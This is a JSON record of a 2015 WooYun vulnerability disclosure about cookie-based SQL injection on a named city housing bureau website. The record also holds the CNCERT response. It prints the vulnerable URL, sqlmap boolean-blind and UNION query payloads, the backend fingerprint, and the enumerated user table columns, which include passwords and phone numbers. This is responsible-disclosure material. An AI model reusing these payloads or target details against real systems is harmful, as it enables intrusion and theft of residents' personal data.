{"id": 25733, "wybug_id": "wooyun-2015-0130626", "wybug_title": "某市房产管理局存在sql注入漏洞，暴露大量居民用户信息", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-08-02 22:09", "wybug_open_date": "2015-09-19 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向公众公开  简要描述：  详细说明：  某市房产管理局存在sql注入漏洞，暴露大量用户信息漏洞页面：http://www.akfc.gov.cn/shownews.asp?id=156  存在cookie中转注入还有大量的页面，都是同样的问题\n\n经典的防注入程序，\n15:31:17] [INFO] Cookie parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectableCookie parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 28 HTTP(s) requests:---Place: CookieParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=636 AND 8331=8331    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: id=-9911 UNION ALL SELECT NULL,CHR(113)&CHR(105)&CHR(105)&CHR(99)&CHR(113)&CHR(75)&CHR(97)&CHR(82)&CHR(85)&CHR(81)&CHR(89)&CHR(66)&CHR(120)&CHR(102)&CHR(110)&CHR(113)&CHR(105)&CHR(114)&CHR(116)&CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%16---[15:31:22] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[15:31:22] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/www.akfc.gov.cn'[*] shutting down at 15:31:22Database: Microsoft_Access_masterdb[9 tables]+----------+| user     || admin    || adv      || download || feedback || market   || news     || product  || vote     |Database: Microsoft_Access_masterdbTable: user[11 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| data     | non-numeric || email    | non-numeric || homepage | non-numeric || id       | numeric     || logins   | numeric     || mobile   | numeric     || password | non-numeric || phone    | non-numeric || question | non-numeric || userid   | numeric     || username | non-numeric |+----------+-------------+\n这里跑了个表，得到的信息如下；其他的就不再继续下去了\n\n\n\n   漏洞证明：  如上，暴露了大量居民信息，   修复方案：  过滤id   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-05 10:29 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给陕西分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}